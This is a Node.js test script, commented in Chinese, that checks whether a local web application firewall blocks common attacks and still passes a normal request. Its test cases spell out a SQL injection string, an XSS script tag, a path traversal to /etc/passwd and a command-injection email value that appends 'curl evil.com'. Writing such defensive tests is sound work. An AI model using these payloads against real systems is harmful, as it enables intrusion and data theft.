// 应用层 WAF 规则测试
import dotenv from 'dotenv'

dotenv.config({ path: ['.env', '.env.local'], override: true })

const BASE = 'http://localhost:3001'

async function req(path, options = {}) {
  const res = await fetch(`${BASE}${path}`, {
    method: options.method || 'GET',
    headers: {
      'Content-Type': 'application/json',
      ...(options.headers || {}),
    },
    body: options.body ? JSON.stringify(options.body) : undefined,
  })
  const text = await res.text()
  let json = null
  try { json = JSON.parse(text) } catch {}
  return { status: res.status, json }
}

function assert(condition, message) {
  if (!condition) throw new Error(message)
}

async function main() {
  console.log('🛡️ 应用层 WAF 规则测试\n')

  // 1. SQL 注入（GET 查询参数）
  const { status: s1 } = await req('/api/health?id=1\' OR \'1\'=\'1')
  assert(s1 === 403 || s1 === 400, `SQLi 应被拦截，实际 ${s1}`)
  console.log('  ✅ GET 查询参数 SQL 注入被拦截')

  // 2. XSS（GET 查询参数）
  const { status: s2 } = await req('/api/health?x=<script>alert(1)</script>')
  assert(s2 === 403 || s2 === 400, `XSS 应被拦截，实际 ${s2}`)
  console.log('  ✅ XSS 被拦截')

  // 3. 路径遍历（请求路径）
  const { status: s3 } = await req('/api/health/../../../etc/passwd')
  assert(s3 === 403 || s3 === 400, `路径遍历应被拦截，实际 ${s3}`)
  console.log('  ✅ 路径遍历被拦截')

  // 4. 命令注入（POST body）
  const { status: s4 } = await req('/api/login', {
    method: 'POST',
    body: { email: 'a@b.com; curl evil.com', password: 'x' },
  })
  assert(s4 === 403 || s4 === 400, `命令注入应被拦截，实际 ${s4}`)
  console.log('  ✅ POST body 命令注入被拦截')

  // 5. 正常请求应通过
  const { status: s5 } = await req('/api/health')
  assert(s5 === 200, `正常请求应通过，实际 ${s5}`)
  console.log('  ✅ 正常请求未被误拦截')

  console.log('\n✅ WAF 规则测试通过')
}

main().catch(err => {
  console.error('\n❌ 测试失败:', err.message)
  process.exit(1)
})
